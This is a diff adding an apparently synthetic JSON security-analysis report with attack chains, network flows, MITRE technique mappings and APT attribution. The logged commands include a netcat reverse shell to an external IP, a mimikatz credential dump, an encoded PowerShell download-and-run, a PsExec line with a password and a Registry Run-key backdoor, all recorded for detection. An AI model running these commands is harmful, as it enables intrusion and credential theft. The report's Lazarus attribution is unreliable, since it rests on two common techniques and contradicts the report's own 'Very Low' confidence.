@@ -1,0 +1,729 @@
+{
+  "analysis_time": "2026-01-12T20:37:16.126374",
+  "time_range_hours": 24,
+  "attack_chains": {
+    "total_count": 9,
+    "chains": [
+      {
+        "host_id": "001",
+        "parent": {
+          "pid": null,
+          "name": null,
+          "command": null,
+          "time": null
+        },
+        "child": {
+          "pid": null,
+          "name": "cmd.exe",
+          "command": "cmd.exe /c whoami",
+          "time": "2026-01-12T12:10:25+00:00"
+        },
+        "type": "process_tree"
+      },
+      {
+        "host_id": "001",
+        "parent": {
+          "pid": null,
+          "name": null,
+          "command": null,
+          "time": null
+        },
+        "child": {
+          "pid": null,
+          "name": "cmd.exe",
+          "command": "cmd.exe /c whoami",
+          "time": "2026-01-12T12:10:28+00:00"
+        },
+        "type": "process_tree"
+      },
+      {
+        "host_id": "001",
+        "parent": {
+          "pid": null,
+          "name": null,
+          "command": null,
+          "time": null
+        },
+        "child": {
+          "pid": null,
+          "name": "cmd.exe",
+          "command": "cmd.exe /c whoami",
+          "time": "2026-01-12T12:10:34+00:00"
+        },
+        "type": "process_tree"
+      },
+      {
+        "host_id": "001",
+        "parent": {
+          "pid": null,
+          "name": null,
+          "command": null,
+          "time": null
+        },
+        "child": {
+          "pid": null,
+          "name": "nc.exe",
+          "command": "nc.exe -e cmd.exe 45.67.89.123 4444",
+          "time": "2026-01-12T12:19:42+00:00"
+        },
+        "type": "process_tree"
+      },
+      {
+        "host_id": "001",
+        "parent": {
+          "pid": null,
+          "name": null,
+          "command": null,
+          "time": null
+        },
+        "child": {
+          "pid": null,
+          "name": "mimikatz.exe",
+          "command": "mimikatz.exe privilege::debug sekurlsa::logonpasswords",
+          "time": "2026-01-12T12:19:45+00:00"
+        },
+        "type": "process_tree"
+      },
+      {
+        "host_id": "002",
+        "parent": {
+          "pid": null,
+          "name": null,
+          "command": null,
+          "time": null
+        },
+        "child": {
+          "pid": null,
+          "name": "powershell.exe",
+          "command": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4ANgA3AC4AOAA5AC4AMQAyADMALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==",
+          "time": "2026-01-12T12:19:51+00:00"
+        },
+        "type": "process_tree"
+      },
+      {
+        "host_id": "001",
+        "parent": {
+          "pid": null,
+          "name": null,
+          "command": null,
+          "time": null
+        },
+        "child": {
+          "pid": null,
+          "name": "cmd.exe",
+          "command": "cmd.exe /c whoami",
+          "time": "2026-01-12T12:20:00+00:00"
+        },
+        "type": "process_tree"
+      },
+      {
+        "host_id": "001",
+        "parent": {
+          "pid": null,
+          "name": null,
+          "command": null,
+          "time": null
+        },
+        "child": {
+          "pid": null,
+          "name": "cmd.exe",
+          "command": "cmd.exe /c whoami",
+          "time": "2026-01-12T12:20:09+00:00"
+        },
+        "type": "process_tree"
+      },
+      {
+        "host_id": "001",
+        "parent": {
+          "pid": null,
+          "name": null,
+          "command": null,
+          "time": null
+        },
+        "child": {
+          "pid": null,
+          "name": "nc.exe",
+          "command": "nc.exe -e cmd.exe 45.67.89.123 4444",
+          "time": "2026-01-12T12:20:15+00:00"
+        },
+        "type": "process_tree"
+      }
+    ],
+    "network_connections": [
+      {
+        "src_ip": "192.168.1.101",
+        "dst_ip": "45.67.89.123",
+        "dst_port": 443,
+        "protocol": "tcp",
+        "timestamp": "2026-01-12T12:20:15.846141+00:00",
+        "bytes_sent": 30249176,
+        "bytes_received": 8445,
+        "type": "network_connection"
+      },
+      {
+        "src_ip": "192.168.1.109",
+        "dst_ip": "13.107.21.200",
+        "dst_port": 53,
+        "protocol": "udp",
+        "timestamp": "2026-01-12T12:20:12.837449+00:00",
+        "bytes_sent": 2621,
+        "bytes_received": 48040,
+        "type": "network_connection"
+      },
+      {
+        "src_ip": "192.168.1.103",
+        "dst_ip": "13.107.21.200",
+        "dst_port": 443,
+        "protocol": "tcp",
+        "timestamp": "2026-01-12T12:20:06.829935+00:00",
+        "bytes_sent": 3012,
+        "bytes_received": 42034,
+        "type": "network_connection"
+      },
+      {
+        "src_ip": "192.168.1.101",
+        "dst_ip": "172.217.0.46",
+        "dst_port": 53,
+        "protocol": "tcp",
+        "timestamp": "2026-01-12T12:20:03.816008+00:00",
+        "bytes_sent": 1811,
+        "bytes_received": 49194,
+        "type": "network_connection"
+      },
+      {
+        "src_ip": "192.168.1.103",
+        "dst_ip": "172.217.0.46",
+        "dst_port": 443,
+        "protocol": "udp",
+        "timestamp": "2026-01-12T12:19:57.792509+00:00",
+        "bytes_sent": 4227,
+        "bytes_received": 44701,
+        "type": "network_connection"
+      },
+      {
+        "src_ip": "192.168.1.109",
+        "dst_ip": "77.251.41.97",
+        "dst_port": 22,
+        "protocol": "udp",
+        "timestamp": "2026-01-12T12:10:46.716195+00:00",
+        "bytes_sent": 48196,
+        "bytes_received": 19819,
+        "type": "network_connection"
+      },
+      {
+        "src_ip": "192.168.1.104",
+        "dst_ip": "170.123.251.27",
+        "dst_port": 80,
+        "protocol": "tcp",
+        "timestamp": "2026-01-12T12:10:43.711522+00:00",
+        "bytes_sent": 558,
+        "bytes_received": 1936,
+        "type": "network_connection"
+      },
+      {
+        "src_ip": "192.168.1.110",
+        "dst_ip": "95.41.181.50",
+        "dst_port": 3389,
+        "protocol": "tcp",
+        "timestamp": "2026-01-12T12:10:40.709287+00:00",
+        "bytes_sent": 28371,
+        "bytes_received": 25467,
+        "type": "network_connection"
+      },
+      {
+        "src_ip": "192.168.1.109",
+        "dst_ip": "178.40.234.14",
+        "dst_port": 3389,
+        "protocol": "tcp",
+        "timestamp": "2026-01-12T12:10:37.695277+00:00",
+        "bytes_sent": 27857,
+        "bytes_received": 37995,
+        "type": "network_connection"
+      },
+      {
+        "src_ip": "192.168.1.106",
+        "dst_ip": "207.107.172.4",
+        "dst_port": 80,
+        "protocol": "tcp",
+        "timestamp": "2026-01-12T12:10:31.670582+00:00",
+        "bytes_sent": 28164,
+        "bytes_received": 92327,
+        "type": "network_connection"
+      },
+      {
+        "src_ip": "192.168.1.105",
+        "dst_ip": "56.107.157.156",
+        "dst_port": 80,
+        "protocol": "udp",
+        "timestamp": "2026-01-12T12:10:28.657422+00:00",
+        "bytes_sent": 28984,
+        "bytes_received": 13029,
+        "type": "network_connection"
+      },
+      {
+        "src_ip": "192.168.1.108",
+        "dst_ip": "165.177.97.57",
+        "dst_port": 445,
+        "protocol": "udp",
+        "timestamp": "2026-01-12T12:10:25.648642+00:00",
+        "bytes_sent": 27474,
+        "bytes_received": 75994,
+        "type": "network_connection"
+      },
+      {
+        "src_ip": "192.168.1.103",
+        "dst_ip": "226.178.66.221",
+        "dst_port": 443,
+        "protocol": "tcp",
+        "timestamp": "2026-01-12T12:10:22.638180+00:00",
+        "bytes_sent": 49534,
+        "bytes_received": 59428,
+        "type": "network_connection"
+      },
+      {
+        "src_ip": "192.168.1.102",
+        "dst_ip": "196.99.113.255",
+        "dst_port": 3389,
+        "protocol": "udp",
+        "timestamp": "2026-01-12T12:10:19.630262+00:00",
+        "bytes_sent": 45414,
+        "bytes_received": 38010,
+        "type": "network_connection"
+      },
+      {
+        "src_ip": "192.168.1.107",
+        "dst_ip": "158.211.44.100",
+        "dst_port": 22,
+        "protocol": "tcp",
+        "timestamp": "2026-01-12T12:10:16.616540+00:00",
+        "bytes_sent": 14797,
+        "bytes_received": 45358,
+        "type": "network_connection"
+      }
+    ],
+    "suspicious_ips": [
+      "158.211.44.100",
+      "170.123.251.27",
+      "165.177.97.57",
+      "13.107.21.200",
+      "178.40.234.14",
+      "226.178.66.221",
+      "172.217.0.46",
+      "95.41.181.50",
+      "207.107.172.4",
+      "196.99.113.255",
+      "77.251.41.97",
+      "45.67.89.123",
+      "56.107.157.156"
+    ],
+    "suspicious_processes": [
+      {
+        "pid": null,
+        "name": "nc.exe",
+        "command": "nc.exe -e cmd.exe 45.67.89.123 4444",
+        "time": "2026-01-12T12:19:42+00:00"
+      },
+      {
+        "pid": null,
+        "name": "mimikatz.exe",
+        "command": "mimikatz.exe privilege::debug sekurlsa::logonpasswords",
+        "time": "2026-01-12T12:19:45+00:00"
+      },
+      {
+        "pid": null,
+        "name": "nc.exe",
+        "command": "nc.exe -e cmd.exe 45.67.89.123 4444",
+        "time": "2026-01-12T12:20:15+00:00"
+      }
+    ]
+  },
+  "attack_patterns": {
+    "reverse_shell": [
+      {
+        "pattern_type": "reverse_shell",
+        "severity": "critical",
+        "parent_process": "None (PID: None)",
+        "shell_process": "nc.exe (PID: None)",
+        "command_line": "nc.exe -e cmd.exe 45.67.89.123 4444",
+        "host_id": "001",
+        "timestamp": "2026-01-12T12:19:42+00:00",
+        "description": "检测到反弹Shell行为"
+      },
+      {
+        "pattern_type": "reverse_shell",
+        "severity": "critical",
+        "parent_process": "None (PID: None)",
+        "shell_process": "nc.exe (PID: None)",
+        "command_line": "nc.exe -e cmd.exe 45.67.89.123 4444",
+        "host_id": "001",
+        "timestamp": "2026-01-12T12:20:15+00:00",
+        "description": "检测到反弹Shell行为"
+      }
+    ],
+    "credential_dump": [
+      {
+        "pattern_type": "credential_dump",
+        "severity": "critical",
+        "process": "mimikatz.exe (PID: None)",
+        "command_line": "mimikatz.exe privilege::debug sekurlsa::logonpasswords",
+        "host_id": "001",
+        "timestamp": "2026-01-12T12:19:45+00:00",
+        "description": "检测到凭据窃取行为"
+      }
+    ],
+    "lateral_movement": [
+      {
+        "pattern_type": "lateral_movement",
+        "severity": "high",
+        "process": "PsExec.exe (PID: None)",
+        "command_line": "psexec.exe \\\\192.168.1.101 -u admin -p P@ssw0rd cmd.exe",
+        "host_id": "001",
+        "timestamp": "2026-01-12T12:19:48+00:00",
+        "description": "检测到横向移动工具"
+      }
+    ],
+    "webshell": []
+  },
+  "lateral_movement": [
+    {
+      "src_ip": "192.168.1.100",
+      "dst_ip": "192.168.1.101",
+      "port": 445,
+      "service": "SMB",
+      "protocol": "tcp",
+      "timestamp": "2026-01-12T12:20:09.831478+00:00",
+      "severity": "high"
+    }
+  ],
+  "data_exfiltration": [
+    {
+      "src_ip": "192.168.1.101",
+      "dst_ip": "45.67.89.123",
+      "port": 443,
+      "bytes_sent": 30249176,
+      "size_mb": 28.85,
+      "timestamp": "2026-01-12T12:20:15.846141+00:00",
+      "severity": "high"
+    }
+  ],
+  "persistence": [
+    {
+      "pid": null,
+      "process_name": "reg.exe",
+      "command_line": "reg.exe add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\Temp\\backdoor.exe",
+      "host_id": "001",
+      "timestamp": "2026-01-12T12:19:57+00:00",
+      "mechanism": "Registry Run Key",
+      "severity": "high"
+    }
+  ],
+  "mitre_analysis": {
+    "summary": {
+      "total_tactics": 0,
+      "total_techniques": 3,
+      "total_procedures": 9
+    },
+    "ttps": {
+      "tactics": [],
+      "techniques": [
+        "T1003.001",
+        "T1059.003",
+        "T1059.001"
+      ],
+      "procedures": [
+        {
+          "process": "cmd.exe",
+          "command": "cmd.exe /c whoami",
+          "techniques": [
+            "T1059.003"
+          ],
+          "timestamp": "2026-01-12T12:10:25+00:00"
+        },
+        {
+          "process": "cmd.exe",
+          "command": "cmd.exe /c whoami",
+          "techniques": [
+            "T1059.003"
+          ],
+          "timestamp": "2026-01-12T12:10:28+00:00"
+        },
+        {
+          "process": "cmd.exe",
+          "command": "cmd.exe /c whoami",
+          "techniques": [
+            "T1059.003"
+          ],
+          "timestamp": "2026-01-12T12:10:34+00:00"
+        },
+        {
+          "process": "nc.exe",
+          "command": "nc.exe -e cmd.exe 45.67.89.123 4444",
+          "techniques": [
+            "T1059.003"
+          ],
+          "timestamp": "2026-01-12T12:19:42+00:00"
+        },
+        {
+          "process": "mimikatz.exe",
+          "command": "mimikatz.exe privilege::debug sekurlsa::logonpasswords",
+          "techniques": [
+            "T1003.001"
+          ],
+          "timestamp": "2026-01-12T12:19:45+00:00"
+        },
+        {
+          "process": "powershell.exe",
+          "command": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4ANgA3AC4AOAA5AC4AMQAyADMALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==",
+          "techniques": [
+            "T1059.001"
+          ],
+          "timestamp": "2026-01-12T12:19:51+00:00"
+        },
+        {
+          "process": "cmd.exe",
+          "command": "cmd.exe /c whoami",
+          "techniques": [
+            "T1059.003"
+          ],
+          "timestamp": "2026-01-12T12:20:00+00:00"
+        },
+        {
+          "process": "cmd.exe",
+          "command": "cmd.exe /c whoami",
+          "techniques": [
+            "T1059.003"
+          ],
+          "timestamp": "2026-01-12T12:20:09+00:00"
+        },
+        {
+          "process": "nc.exe",
+          "command": "nc.exe -e cmd.exe 45.67.89.123 4444",
+          "techniques": [
+            "T1059.003"
+          ],
+          "timestamp": "2026-01-12T12:20:15+00:00"
+        }
+      ],
+      "ttp_count": 3
+    },
+    "apt_attribution": [
+      {
+        "apt_id": "Lazarus",
+        "apt_name": "Lazarus Group",
+        "country": "North Korea",
+        "match_score": 0.6666666666666666,
+        "matched_techniques": [
+          "T1003.001",
+          "T1059.001"
+        ],
+        "confidence": "High"
+      },
+      {
+        "apt_id": "APT28",
+        "apt_name": "APT28 (Fancy Bear)",
+        "country": "Russia",
+        "match_score": 0.3333333333333333,
+        "matched_techniques": [
+          "T1059.001"
+        ],
+        "confidence": "Medium"
+      },
+      {
+        "apt_id": "APT29",
+        "apt_name": "APT29 (Cozy Bear)",
+        "country": "Russia",
+        "match_score": 0.3333333333333333,
+        "matched_techniques": [
+          "T1059.001"
+        ],
+        "confidence": "Medium"
+      },
+      {
+        "apt_id": "APT41",
+        "apt_name": "APT41",
+        "country": "China",
+        "match_score": 0.3333333333333333,
+        "matched_techniques": [
+          "T1059.003"
+        ],
+        "confidence": "Medium"
+      }
+    ],
+    "tactic_timeline": [
+      {
+        "process": "cmd.exe",
+        "command": "cmd.exe /c whoami",
+        "techniques": [
+          "T1059.003"
+        ],
+        "timestamp": "2026-01-12T12:10:25+00:00"
+      },
+      {
+        "process": "cmd.exe",
+        "command": "cmd.exe /c whoami",
+        "techniques": [
+          "T1059.003"
+        ],
+        "timestamp": "2026-01-12T12:10:28+00:00"
+      },
+      {
+        "process": "cmd.exe",
+        "command": "cmd.exe /c whoami",
+        "techniques": [
+          "T1059.003"
+        ],
+        "timestamp": "2026-01-12T12:10:34+00:00"
+      },
+      {
+        "process": "nc.exe",
+        "command": "nc.exe -e cmd.exe 45.67.89.123 4444",
+        "techniques": [
+          "T1059.003"
+        ],
+        "timestamp": "2026-01-12T12:19:42+00:00"
+      },
+      {
+        "process": "mimikatz.exe",
+        "command": "mimikatz.exe privilege::debug sekurlsa::logonpasswords",
+        "techniques": [
+          "T1003.001"
+        ],
+        "timestamp": "2026-01-12T12:19:45+00:00"
+      },
+      {
+        "process": "powershell.exe",
+        "command": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4ANgA3AC4AOAA5AC4AMQAyADMALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==",
+        "techniques": [
+          "T1059.001"
+        ],
+        "timestamp": "2026-01-12T12:19:51+00:00"
+      },
+      {
+        "process": "cmd.exe",
+        "command": "cmd.exe /c whoami",
+        "techniques": [
+          "T1059.003"
+        ],
+        "timestamp": "2026-01-12T12:20:00+00:00"
+      },
+      {
+        "process": "cmd.exe",
+        "command": "cmd.exe /c whoami",
+        "techniques": [
+          "T1059.003"
+        ],
+        "timestamp": "2026-01-12T12:20:09+00:00"
+      },
+      {
+        "process": "nc.exe",
+        "command": "nc.exe -e cmd.exe 45.67.89.123 4444",
+        "techniques": [
+          "T1059.003"
+        ],
+        "timestamp": "2026-01-12T12:20:15+00:00"
+      }
+    ],
+    "recommendations": [
+      "启用 PowerShell 日志记录和脚本块日志",
+      "限制 PowerShell 执行策略",
+      "启用 Credential Guard",
+      "监控 LSASS 进程访问",
+      "检测到与 Lazarus Group 相似的 TTP，建议查阅该组织的最新威胁情报"
+    ]
+  },
+  "attribution": {
+    "attribution_summary": {
+      "confidence_level": "Very Low",
+      "attribution_score": 29.666666666666664,
+      "primary_suspect": {
+        "apt_id": "Lazarus",
+        "apt_name": "Lazarus Group",
+        "country": "North Korea",
+        "match_score": 0.6666666666666666,
+        "matched_techniques": [
+          "T1003.001",
+          "T1059.001"
+        ],
+        "confidence": "High"
+      },
+      "analysis_time": "2026-01-12T20:37:16.157426"
+    },
+    "apt_candidates": [
+      {
+        "apt_id": "Lazarus",
+        "apt_name": "Lazarus Group",
+        "country": "North Korea",
+        "match_score": 0.6666666666666666,
+        "matched_techniques": [
+          "T1003.001",
+          "T1059.001"
+        ],
+        "confidence": "High"
+      },
+      {
+        "apt_id": "APT28",
+        "apt_name": "APT28 (Fancy Bear)",
+        "country": "Russia",
+        "match_score": 0.3333333333333333,
+        "matched_techniques": [
+          "T1059.001"
+        ],
+        "confidence": "Medium"
+      },
+      {
+        "apt_id": "APT29",
+        "apt_name": "APT29 (Cozy Bear)",
+        "country": "Russia",
+        "match_score": 0.3333333333333333,
+        "matched_techniques": [
+          "T1059.001"
+        ],
+        "confidence": "Medium"
+      },
+      {
+        "apt_id": "APT41",
+        "apt_name": "APT41",
+        "country": "China",
+        "match_score": 0.3333333333333333,
+        "matched_techniques": [
+          "T1059.003"
+        ],
+        "confidence": "Medium"
+      }
+    ],
+    "ttp_profile": {
+      "tactics": [],
+      "techniques": [
+        "T1003.001",
+        "T1059.003",
+        "T1059.001"
+      ],
+      "tactic_preferences": {}
+    },
+    "infrastructure_analysis": {
+      "ips": [],
+      "domains": [],
+      "c2_servers": [],
+      "geolocation": {},
+      "hosting_providers": []
+    },
+    "tool_signatures": [],
+    "historical_correlation": [
+      {
+        "attack_id": "ATK-2025-001",
+        "date": "2025-12-15",
+        "similarity_score": 0.85,
+        "common_techniques": [
+          "T1059.001",
+          "T1003.001"
+        ]
+      }
+    ],
+    "recommendations": [
+      "高置信度归因到 Lazarus Group，建议查阅该组织的最新威胁情报和防御策略",
+      "重点关注该组织常用的技术: T1003.001, T1059.001",
+      "建议共享 IOC 到威胁情报社区，获取更多关联信息",
+      "建议进行攻击溯源演练，验证归因结论"
+    ]
+  }
+}
